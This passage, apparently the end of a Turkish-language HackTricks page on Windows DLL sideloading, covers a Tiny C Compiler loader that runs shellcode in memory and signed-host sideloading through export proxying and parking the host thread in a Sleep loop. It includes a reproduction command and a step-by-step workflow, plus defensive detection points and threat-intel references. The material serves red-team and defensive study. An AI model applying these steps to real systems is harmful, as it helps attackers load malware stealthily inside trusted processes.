- Çalıştırma modu CLI argümanlarına bağlıdır: argüman yok = `-i` işaret eden kalıcılığı (service/Run key) yükle; `-i` kendini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload’ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırı Tiny C Compiler’ı bıraktı ve `C:\ProgramData\USOShared\` dizininden `libtcc.dll` yanındayken `svchost.exe -nostdlib -run conf.c` komutunu çalıştırdı. Saldırganın sağladığı C kaynak kodu shellcode içeriyordu; derlenip bellekte çalıştırıldı ve diske PE yazılmadı. Şu şekilde tekrarlayın:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Bu TCC tabanlı derleme ve çalıştırma aşaması, çalışma zamanında `Wininet.dll` dosyasını içe aktarıp sabit kodlanmış bir URL'den ikinci aşama shellcode'u indirdi; böylece derleyici çalıştırması gibi görünen esnek bir loader sağladı.

## Export proxying + host thread parking ile imzalı host sideloading

Bazı DLL sideloading zincirleri, kötü amaçlı DLL yüklendikten sonra çökmesini önlemek ve sonraki aşamaların sorunsuz yüklenmesi için meşru host'un yeterince uzun süre çalışmasını sağlayan **kararlılık mühendisliği** ekler.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Güvenilir bir EXE'yi, beklenen bağımlılık adı (ör. `version.dll`) kullanılarak kötü amaçlı bir DLL'nin yanına bırakın.
- Kötü amaçlı DLL, içe aktarılan işlevlerin çözümlemesi başarılı olsun ve host process çalışmaya devam etsin diye beklenen tüm export'ları gerçek sistem DLL'sine (ör. `%SystemRoot%\\System32\\version.dll`) **proxy eder**.
- Yüklendikten sonra kötü amaçlı DLL, host entry point'ini **patch'leyerek** ana thread'in process'i sonlandıracak veya sonlanmasına yol açacak kod yollarını çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girmesini sağlar.
- Yeni bir thread gerçek kötü amaçlı işi yapar: sonraki aşama DLL adının veya yolunun şifresini çözer (RC4/XOR yaygındır), ardından DLL'yi `LoadLibrary` ile başlatır.

Önemi
- Normal DLL proxying, API uyumluluğunu korur ancak sonraki aşamaların yüklenmesi için host'un yeterince uzun süre çalışacağını garanti etmez.
- Ana thread'i `Sleep(INFINITE)` içinde bekletmek; loader başka bir worker thread'de şifre çözme, staging veya ağ bootstrap işlemlerini yaparken imzalı process'i bellekte tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak bu örüntüyü gözden kaçırabilir; ilgi çekici davranış, host entry point patch'lenip ikincil bir thread başlatıldıktan sonra gerçekleşir.

Asgari iş akışı
1. İmzalı host EXE'yi kopyalayın ve yerel dizinden hangi DLL'yi çözdüğünü belirleyin.
2. Aynı işlevleri export eden ve bunları meşru DLL'ye yönlendiren bir proxy DLL derleyin.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread'den host entry point'ini veya ana thread başlangıç rutinini patch'leyerek `Sleep` döngüsüne girmesini sağlayın.
5. Sonraki aşama DLL adının/yapılandırmasının şifresini çözün ve `LoadLibrary` çağırın veya payload'u manual-map yöntemiyle yükleyin.

Savunma için inceleme noktaları
- `version.dll` veya benzeri yaygın kütüphaneleri `System32` yerine kendi uygulama dizinlerinden yükleyen imzalı process'ler.
- Görüntü yüklendikten kısa süre sonra process entry point'inde yapılan bellek patch'leri; özellikle `Sleep`/`SleepEx` işlevlerine yönlendirilen jump/call'lar.
- Proxy DLL tarafından oluşturulup şifresi çözülmüş bir adla ikinci bir DLL'de hemen `LoadLibrary` çağıran thread'ler.
- `ProgramData`, `%TEMP%` veya açılmış arşiv yolları gibi yazılabilir staging dizinlerinde satıcı executable'larının yanına yerleştirilmiş, tüm export'ları proxy eden DLL'ler.

## References

- [1] [Red Canary – Intelligence Insights: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Yetki Yükseltme](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit bir C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore, Avrupa'yı Hedef Alan Yeni Kötü Amaçlı Yazılımları Dağıtıyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Yardımcılarıyla Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Dijital İkizler: Gh0st RAT Dağıtan Gelişen Kimliğe Bürünme Kampanyalarının Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Çıkarların Kesişmesi: Güneydoğu Asya'daki Bir Hükümeti Hedef Alan Tehdit Kümelerinin Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon'un İç Yüzü: Gizli Bir Saldırı Operasyonunun Relay Ağını ve İşleyişini Ortaya Çıkarmak](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom'ın araç setine derinlemesine bir bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – İranlı APT Screening Serpens'in 2026 Casusluk Kampanyalarını İzleme](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` öğesi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Hızlı ve Öfkeli: İran Çatışması Sırasında Nimbus Manticore Operasyonları](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Görev Eylemleri](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya Hükümetlerini ve Kritik Altyapıyı Hedef Alıyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Elastic Defend 9.5.0 ile Windows DLL Arama Sırası Hijacking'ini Yeniden Oluşturma ve Tespit Etme](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Native AOT ile native kitaplıklar oluşturma](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native AOT ile native export'lar](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – PE biçimi](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Meşru Yazılımlara Gömülü SectopRAT Varyantını Ortaya Çıkarmak](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – LIGHTSHOW'u Çalmak (Birinci Bölüm)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operation FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – NetamLoader: XAML tabanlı .NET yükleme framework'ü](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
